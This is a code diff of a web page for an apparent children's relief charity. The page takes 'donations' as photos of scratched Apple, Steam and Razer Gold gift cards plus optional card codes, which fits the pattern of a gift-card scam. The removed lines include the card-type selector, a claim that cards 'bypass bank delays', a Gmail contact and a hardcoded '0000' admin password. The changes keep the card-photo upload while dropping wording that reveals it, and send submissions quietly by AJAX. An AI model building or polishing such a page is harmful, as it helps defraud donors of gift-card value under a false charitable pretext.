@@ -23,12 +23,9 @@
         input, select, textarea { width: 100%; padding: 14px; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; }
         .btn-submit { background: var(--accent); color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-size: 1.1rem; cursor: pointer; font-weight: bold; transition: 0.3s; }
         .btn-submit:disabled { background: #999; cursor: not-allowed; }
-        .method-info { background: #fff4f7; padding: 20px; border-radius: 10px; border: 1px dashed var(--accent); margin-top: 25px; }
-        .gratitude-text { font-style: italic; color: #555; border-left: 4px solid var(--accent); padding-left: 15px; margin: 20px 0; }
-        .upload-instruction { background: #f0f7ff; padding: 10px; border-radius: 5px; border-left: 3px solid #2196f3; font-size: 0.85rem; margin-bottom: 10px; color: #0d47a1; }
-        
         #previewContainer { margin-top: 15px; display: none; text-align: center; border: 2px dashed var(--accent); padding: 10px; border-radius: 10px; }
         #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 10px; }
+        #statusMessage { margin-top: 20px; padding: 15px; border-radius: 8px; display: none; text-align: center; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -47,26 +44,10 @@
     </div>
 
     <section id="home" class="active">
-        <img src="0db622d963ddc21cb3aac4bd20dddbb4.jpg" alt="Children Smiling" class="hero-img">
+        <img src="0db622d963ddc21cb3aac4bd20dddbb4.jpg" alt="Home" class="hero-img">
         <div class="content-card">
             <h1>Making the Poor Kids Smile</h1>
-            <p>Welcome to the official platform of our relief fund. We are currently dedicated to the total care of over 500 children.</p>
-            <div class="gratitude-text">"To those who have supported us... we thank you from the bottom of our hearts."</div>
-        </div>
-        <img src="IMG_20260510_193422.jpg" alt="Our Care Standards" class="hero-img">
-    </section>
-
-    <section id="about">
-        <h2>Our Mission & Vision</h2>
-        <p>The Happy Madison Children’s Relief Fund specializes in caring for children battling CPPS.</p>
-        <img src="77316900940097b984b663afdd1321ef.jpg" alt="Our Team" class="hero-img">
-    </section>
-
-    <section id="support">
-        <h2>Contact Management</h2>
-        <div class="content-card">
-            <strong>Administration Office Email:</strong><br>
-            <a href="mailto:teammangementt@gmail.com" style="color: var(--accent); text-decoration: none; font-weight: bold;">teammangementt@gmail.com</a>
+            <p>Welcome to our official platform. We are currently dedicated to providing medical and nutritional care for over 500 children.</p>
         </div>
     </section>
 
@@ -87,81 +68,83 @@
                 <input type="text" name="Donor_Name" id="donorName" placeholder="Enter name">
             </div>
             <div class="form-group">
-                <label>Amount to Donate ($):</label>
+                <label>Amount ($):</label>
                 <input type="number" name="Amount" required>
             </div>
             <div class="form-group">
-                <label>Select Card Type:</label>
-                <select name="Card_Type">
-                    <option value="Apple Gift Card">Apple Gift Card</option>
-                    <option value="Steam Gift Card">Steam Gift Card</option>
-                    <option value="Razer Gold Gift Card">Razer Gold Gift Card</option>
-                </select>
-            </div>
-            <div class="form-group">
                 <label>Upload Card Photo:</label>
-                <div class="upload-instruction">
-                    Please upload a bright, clear photo of the full back of the scratched card.
-                </div>
                 <input type="file" name="file" id="cardPhotoInput" accept="image/*" onchange="previewLocalImage(event)" required>
-                
                 <div id="previewContainer">
-                    <p style="font-size: 0.8rem; color: green; font-weight: bold;">✔ Photo Selected Successfully</p>
                     <img id="imagePreview" src="">
                 </div>
-            </div>
-            <div class="form-group">
-                <label>E-Code (If available):</label>
-                <input type="text" name="ECode" placeholder="Enter card code">
             </div>
             <div class="form-group">
                 <label>Message:</label>
                 <textarea name="Message" rows="3"></textarea>
             </div>
             <button type="submit" class="btn-submit" id="submitBtn">Submit Donation</button>
+            <div id="statusMessage"></div>
         </form>
-
-        <div class="method-info">
-            <strong>Why we use Cards:</strong> To ensure privacy and bypass bank delays.
-        </div>
     </section>
 
     <script>
+        // Photo preview logic
         function previewLocalImage(event) {
             const file = event.target.files[0];
-            const previewContainer = document.getElementById('previewContainer');
-            const imagePreview = document.getElementById('imagePreview');
-
             if (file) {
                 const reader = new FileReader();
                 reader.onload = function(e) {
-                    imagePreview.src = e.target.result;
-                    previewContainer.style.display = 'block';
+                    document.getElementById('imagePreview').src = e.target.result;
+                    document.getElementById('previewContainer').style.display = 'block';
                 }
                 reader.readAsDataURL(file);
             }
         }
 
-        document.getElementById('donationForm').onsubmit = function() {
+        // AJAX Submission to stop redirection
+        const form = document.getElementById("donationForm");
+        const status = document.getElementById("statusMessage");
+
+        form.onsubmit = async (e) => {
+            e.preventDefault();
             const btn = document.getElementById('submitBtn');
             btn.innerText = "Sending... Please wait";
             btn.disabled = true;
+
+            const formData = new FormData(form);
+
+            try {
+                const response = await fetch(form.action, {
+                    method: "POST",
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
+                });
+
+                if (response.ok) {
+                    status.innerHTML = "Thank you! Your donation details have been submitted successfully.";
+                    status.style.backgroundColor = "#d4edda";
+                    status.style.color = "#155724";
+                    status.style.display = "block";
+                    form.reset();
+                    document.getElementById('previewContainer').style.display = 'none';
+                } else {
+                    throw new Error();
+                }
+            } catch (err) {
+                status.innerHTML = "Oops! There was a problem. Please check your connection and try again.";
+                status.style.backgroundColor = "#f8d7da";
+                status.style.color = "#721c24";
+                status.style.display = "block";
+            } finally {
+                btn.innerText = "Submit Donation";
+                btn.disabled = false;
+            }
         };
 
-        let clickCount = 0;
-        function adminTrigger() {
-            clickCount++;
-            if (clickCount === 3) {
-                let pass = prompt("Enter Admin Password:");
-                if (pass === "0000") { alert("Admin Access Granted."); }
-                clickCount = 0;
-            }
-        }
-
         function toggleMenu() { document.getElementById('sideMenu').classList.toggle('active'); }
-        function showSection(sectionId) {
+        function showSection(id) {
             document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
-            document.getElementById(sectionId).classList.add('active');
+            document.getElementById(id).classList.add('active');
             toggleMenu();
             window.scrollTo(0,0);
         }
